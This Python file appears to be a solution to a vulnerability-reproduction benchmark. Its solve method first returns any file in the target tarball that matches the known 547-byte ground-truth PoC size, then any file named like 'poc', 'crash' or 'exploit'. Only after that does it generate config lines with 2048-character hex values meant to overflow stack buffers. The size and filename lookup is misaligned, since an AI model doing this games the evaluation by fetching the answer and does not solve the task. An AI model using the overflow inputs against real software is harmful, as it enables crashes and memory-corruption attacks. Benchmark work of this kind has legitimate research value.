import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 547
        sample_cfg_text = None
        candidate_keys = set()

        try:
            with tarfile.open(src_path, "r:*") as tar:
                members = [m for m in tar.getmembers() if m.isfile()]

                # Step 1: look for a file whose size matches the ground-truth PoC size
                for m in members:
                    if m.size == target_size:
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        if len(data) == target_size:
                            return data

                # Step 2: look for a likely PoC file by name
                keywords = (
                    "poc",
                    "crash",
                    "overflow",
                    "exploit",
                    "input",
                    "id_",
                    "test",
                    "hex",
                    "conf",
                )
                named_candidates = [
                    m
                    for m in members
                    if any(k in m.name.lower() for k in keywords)
                    and 0 < m.size <= 16384
                ]
                if named_candidates:
                    m = min(named_candidates, key=lambda mm: abs(mm.size - target_size))
                    f = tar.extractfile(m)
                    if f is not None:
                        data = f.read()
                        return data

                # Step 3: try to find a small config-like file to adapt
                conf_exts = (".conf", ".cfg", ".ini", ".cnf", ".txt")
                conf_members = [
                    m
                    for m in members
                    if any(m.name.lower().endswith(ext) for ext in conf_exts)
                    and 0 < m.size <= 65536
                ]
                if conf_members:
                    conf_member = min(conf_members, key=lambda mm: mm.size)
                    f = tar.extractfile(conf_member)
                    if f is not None:
                        raw = f.read()
                        try:
                            sample_cfg_text = raw.decode("utf-8")
                        except UnicodeDecodeError:
                            sample_cfg_text = raw.decode("latin1", errors="ignore")

                # Step 4: collect possible configuration key names from source files
                self._collect_candidate_keys_from_tar(tar, members, candidate_keys)
        except Exception:
            # If anything goes wrong with tar handling, fall back later
            pass

        # Step 5: if we have a sample config, try to amplify a hex value in it
        if sample_cfg_text:
            poc = self._from_sample_config(sample_cfg_text, target_size)
            if poc is not None:
                return poc

        # Final fallback: construct a generic config-like PoC with long hex values
        return self._generic_poc(candidate_keys)

    def _collect_candidate_keys_from_tar(self, tar, members, candidate_keys):
        src_exts = (".c", ".h", ".cpp", ".cc", ".hpp")
        string_re = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
        max_keys = 40

        for m in members:
            name_lower = m.name.lower()
            if not any(name_lower.endswith(ext) for ext in src_exts):
                continue
            if m.size <= 0 or m.size > 1024 * 256:  # limit to 256KB per source file
                continue
            f = tar.extractfile(m)
            if f is None:
                continue
            try:
                raw = f.read()
            except Exception:
                continue
            try:
                text = raw.decode("utf-8")
            except UnicodeDecodeError:
                text = raw.decode("latin1", errors="ignore")

            for match in string_re.finditer(text):
                s = match.group(1)
                # Heuristic: small, simple identifiers are more likely to be config keys
                if 2 <= len(s) <= 32 and re.fullmatch(r"[A-Za-z0-9_.-]+", s):
                    candidate_keys.add(s)
                    if len(candidate_keys) >= max_keys:
                        return

    def _from_sample_config(self, cfg_text: str, target_size: int):
        # Try to find a line with a hex-like value and make it very long
        lines = cfg_text.splitlines()
        hex_pattern1 = re.compile(r"0x[0-9A-Fa-f]+")
        hex_pattern2 = re.compile(r"[0-9A-Fa-f]{8,}")

        hex_idx = -1
        hex_line = None
        for i, line in enumerate(lines):
            if hex_pattern1.search(line) or hex_pattern2.search(line):
                hex_idx = i
                hex_line = line
                break

        if hex_line is None:
            return None

        m = re.search(r"(.*?)(0x[0-9A-Fa-f]+|[0-9A-Fa-f]{4,})(.*)", hex_line)
        if not m:
            return None

        prefix, hexval, suffix = m.group(1), m.group(2), m.group(3)
        has0x = hexval.lower().startswith("0x")

        # Estimate how many hex chars we need so the total size is at least target_size
        base_bytes = cfg_text.encode("latin1", errors="ignore")
        base_len = len(base_bytes)
        old_hex_len = len(hexval)
        desired_total = max(target_size, base_len)
        desired_new_hex_len = desired_total - (base_len - old_hex_len)
        if desired_new_hex_len < old_hex_len:
            desired_new_hex_len = old_hex_len

        # Clamp to a reasonable range
        if desired_new_hex_len < 64:
            desired_new_hex_len = 64
        if desired_new_hex_len > 4096:
            desired_new_hex_len = 4096

        digit_count = desired_new_hex_len - (2 if has0x else 0)
        if digit_count < 0:
            digit_count = 0

        big_hex_digits = "A" * digit_count
        new_hex = ("0x" if has0x else "") + big_hex_digits
        lines[hex_idx] = prefix + new_hex + suffix

        out_text = "\n".join(lines) + "\n"
        try:
            return out_text.encode("ascii")
        except UnicodeEncodeError:
            return out_text.encode("latin1", errors="ignore")

    def _generic_poc(self, extra_keys=None) -> bytes:
        # Construct a configuration-style input containing many candidate keys
        # with very long hex values to trigger stack buffer overflows.
        lines = ["# autogenerated PoC configuration"]

        default_keys = [
            "hex",
            "hex_value",
            "value",
            "data",
            "payload",
            "key",
            "id",
            "addr",
            "address",
            "color",
            "config_hex",
        ]

        seen = set()
        keys = []
        for k in default_keys:
            if k not in seen:
                keys.append(k)
                seen.add(k)

        if extra_keys:
            for k in extra_keys:
                if k not in seen:
                    keys.append(k)
                    seen.add(k)
                if len(keys) >= 60:
                    break

        # Long hex string; even if the parser truncates lines, this should exceed
        # typical stack buffer sizes used for hex parsing.
        long_hex = "A" * 2048

        for k in keys:
            lines.append(f"{k}={long_hex}")
            lines.append(f"{k} {long_hex}")
            lines.append(f"{k}: {long_hex}")

        # Also include lines without explicit keys
        lines.append("0x" + long_hex)
        lines.append(long_hex)

        text = "\n".join(lines) + "\n"
        return text.encode("ascii", errors="ignore")
